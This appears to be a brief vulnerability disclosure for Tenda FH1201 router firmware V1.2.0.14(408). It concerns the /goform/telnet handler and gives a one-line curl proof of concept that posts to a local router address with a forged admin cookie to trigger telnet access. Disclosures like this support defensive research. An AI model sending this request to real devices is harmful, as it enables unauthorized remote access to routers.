## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3322.html

## Affected version

FH1201 Firmware  V1.2.0.14(408)

## Vulnerability details

An issue was discovered in FH1201 Firmware  V1.2.0.14(408) devices. An HTTP request within the handler function of the /goform/telnet route. This could lead to Shell Metacharacters.

![image-20240731144148125](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731144148125.png)

## POC

```python
curl -i -X POST http://192.168.84.101/goform/telnet -d aa=aa --cookie "user=admin" --http0.9
```

![image-20240731144329541](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731144329541.png)
